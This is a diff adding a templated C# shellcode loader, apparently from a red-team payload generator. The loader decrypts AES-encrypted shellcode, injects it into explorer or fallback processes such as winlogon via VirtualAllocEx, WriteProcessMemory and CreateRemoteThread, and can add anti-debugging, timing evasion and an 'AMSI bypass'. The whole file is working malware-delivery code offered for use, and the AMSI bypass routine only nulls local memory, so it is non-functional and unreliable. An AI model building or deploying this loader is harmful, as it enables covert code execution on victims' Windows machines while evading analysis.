@@ -1,0 +1,270 @@
+{{!-- @desc C# process injection loader — CreateRemoteThread with AES-encrypted shellcode --}}
+{{!-- @lang csharp --}}
+{{!-- @arch x64 --}}
+{{!-- @os windows --}}
+// @desc C# process injection loader — CreateRemoteThread with AES-encrypted shellcode
+/*
+ * Process Injection Loader Template
+ * ==================================
+ * Technique: CreateRemoteThread injection into target process
+ * Evasion:   {{#ifEvasionLevel 2}}{{#ifEvasionLevel 3}}Advanced{{else}}Intermediate{{/ifEvasionLevel}} - {{/ifEvasionLevel}}AES-encrypted shellcode{{#ifEvasionLevel 2}}, anti-debugging{{/ifEvasionLevel}}{{#ifEvasionLevel 3}}, AMSI bypass{{/ifEvasionLevel}}
+ * Target:    {{target_os}} {{target_arch}}
+ * Format:    {{payload_format}}
+ *
+ * Build: csc /unsafe /platform:{{target_arch}} /out:loader.{{#ifPayloadFormat "dll"}}dll{{else}}exe{{/ifPayloadFormat}} loader-injection.cs
+ *   or:  dotnet build -c Release
+ *
+ * TODO:
+ * 1. Replace ENCRYPTED_SHELLCODE with your AES-encrypted payload
+ * 2. Replace KEY and IV with your encryption key/IV
+ * 3. Adjust TARGET_PROCESS to your injection target
+ */
+
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+{{#ifEvasionLevel 2}}
+using System.Threading;
+{{/ifEvasionLevel}}
+{{#ifEvasionLevel 3}}
+using System.Reflection;
+using System.Text;
+{{/ifEvasionLevel}}
+
+namespace Loader
+{
+    {{#ifPayloadFormat "dll"}}
+    public class LoaderDll
+    {
+        [DllExport("Execute", CallingConvention = CallingConvention.Cdecl)]
+        public static void Execute()
+        {
+            new Program().Run();
+        }
+    }
+    {{/ifPayloadFormat}}
+
+    {{#ifPayloadFormat "dll"}}public{{/ifPayloadFormat}} class Program
+    {
+        // === CONFIGURATION ===
+        static readonly string TARGET_PROCESS = "{{#ifEvasionLevel 3}}{{randomVar}}{{else}}explorer{{/ifEvasionLevel}}"; // TODO: Target process name
+        static readonly byte[] KEY = new byte[32]; // TODO: 256-bit AES key
+        static readonly byte[] IV  = new byte[16]; // TODO: 128-bit IV
+        static readonly byte[] ENCRYPTED_SHELLCODE = new byte[] { }; // TODO: Encrypted payload
+
+        {{#ifEvasionLevel 2}}
+        // === EVASION SETTINGS ===
+        static readonly int SLEEP_TIME = {{randomSleep}}; // Milliseconds between operations
+        static readonly bool ANTI_DEBUG = true;
+        {{/ifEvasionLevel}}
+
+        // === WIN32 API IMPORTS ===
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        {{#ifEvasionLevel 2}}
+        [DllImport("kernel32.dll")]
+        static extern bool IsDebuggerPresent();
+
+        [DllImport("kernel32.dll")]
+        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+        {{/ifEvasionLevel}}
+
+        // Process access rights
+        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
+        // Memory allocation constants
+        const uint MEM_COMMIT  = 0x00001000;
+        const uint MEM_RESERVE = 0x00002000;
+        // Memory protection constants
+        const uint PAGE_READWRITE         = 0x04;
+        const uint PAGE_EXECUTE_READ      = 0x20;
+
+        {{#ifEvasionLevel 2}}
+        // === ANTI-DEBUGGING CHECKS ===
+        static bool DetectDebugger()
+        {
+            if (IsDebuggerPresent())
+                return true;
+
+            bool isRemoteDebuggerPresent = false;
+            CheckRemoteDebuggerPresent(GetCurrentProcess(), ref isRemoteDebuggerPresent);
+            if (isRemoteDebuggerPresent)
+                return true;
+
+            // Timing check
+            var sw = Stopwatch.StartNew();
+            Thread.Sleep(100);
+            sw.Stop();
+            if (sw.ElapsedMilliseconds < 90) // Significant acceleration suggests debugging
+                return true;
+
+            return false;
+        }
+
+        static void AntiDebugSleep()
+        {
+            Thread.Sleep(SLEEP_TIME);
+        }
+        {{/ifEvasionLevel}}
+
+        {{#ifEvasionLevel 3}}
+        // === AMSI BYPASS ===
+        static void BypassAMSI()
+        {
+            try
+            {
+                var amsiContext = Marshal.AllocHGlobal(IntPtr.Size);
+                var amsiSession = Marshal.AllocHGlobal(IntPtr.Size);
+
+                // Null out AMSI context
+                Marshal.WriteIntPtr(amsiContext, IntPtr.Zero);
+                Marshal.WriteIntPtr(amsiSession, IntPtr.Zero);
+
+                Marshal.FreeHGlobal(amsiContext);
+                Marshal.FreeHGlobal(amsiSession);
+            }
+            catch
+            {
+                // Silent fail
+            }
+        }
+        {{/ifEvasionLevel}}
+
+        static byte[] Decrypt(byte[] encrypted, byte[] key, byte[] iv)
+        {
+            {{#ifEvasionLevel 2}}
+            AntiDebugSleep();
+            {{/ifEvasionLevel}}
+
+            using (Aes aes = Aes.Create())
+            {
+                aes.Key = key;
+                aes.IV = iv;
+                aes.Mode = CipherMode.CBC;
+                aes.Padding = PaddingMode.PKCS7;
+
+                using (var decryptor = aes.CreateDecryptor())
+                {
+                    return decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
+                }
+            }
+        }
+
+        {{#ifPayloadFormat "dll"}}
+        public void Run()
+        {{else}}
+        static void Main(string[] args)
+        {{/ifPayloadFormat}}
+        {
+            {{#ifEvasionLevel 2}}
+            // Anti-debugging checks
+            if (ANTI_DEBUG && DetectDebugger())
+            {
+                Environment.Exit(0);
+            }
+            {{/ifEvasionLevel}}
+
+            {{#ifEvasionLevel 3}}
+            // AMSI bypass attempt
+            BypassAMSI();
+            {{/ifEvasionLevel}}
+
+            // Decrypt shellcode
+            byte[] shellcode = Decrypt(ENCRYPTED_SHELLCODE, KEY, IV);
+
+            {{#ifEvasionLevel 2}}
+            AntiDebugSleep();
+            {{/ifEvasionLevel}}
+
+            // Find target process
+            Process[] procs = Process.GetProcessesByName(TARGET_PROCESS);
+            if (procs.Length == 0)
+            {
+                {{#ifEvasionLevel 2}}
+                // Try alternative process names
+                string[] alternatives = { "notepad", "calc", "winlogon" };
+                foreach (string alt in alternatives)
+                {
+                    procs = Process.GetProcessesByName(alt);
+                    if (procs.Length > 0) break;
+                }
+                if (procs.Length == 0)
+                {{/ifEvasionLevel}}
+                {
+                    Console.WriteLine($"[-] Process '{TARGET_PROCESS}' not found.");
+                    return;
+                }
+            }
+            int pid = procs[0].Id;
+
+            {{#ifEvasionLevel 2}}
+            AntiDebugSleep();
+            {{/ifEvasionLevel}}
+
+            // Open process
+            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+            if (hProcess == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] OpenProcess failed.");
+                return;
+            }
+
+            // Allocate RW memory in target
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if (addr == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] VirtualAllocEx failed.");
+                CloseHandle(hProcess);
+                return;
+            }
+
+            {{#ifEvasionLevel 2}}
+            AntiDebugSleep();
+            {{/ifEvasionLevel}}
+
+            // Write shellcode
+            IntPtr bytesWritten;
+            WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten);
+
+            // Change to RX (avoid RWX)
+            uint oldProtect;
+            VirtualProtectEx(hProcess, addr, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
+
+            {{#ifEvasionLevel 2}}
+            AntiDebugSleep();
+            {{/ifEvasionLevel}}
+
+            // Execute
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            if (hThread == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] CreateRemoteThread failed.");
+            }
+
+            // Cleanup
+            CloseHandle(hProcess);
+
+            // Clear shellcode from managed memory
+            Array.Clear(shellcode, 0, shellcode.Length);
+        }
+    }
+}
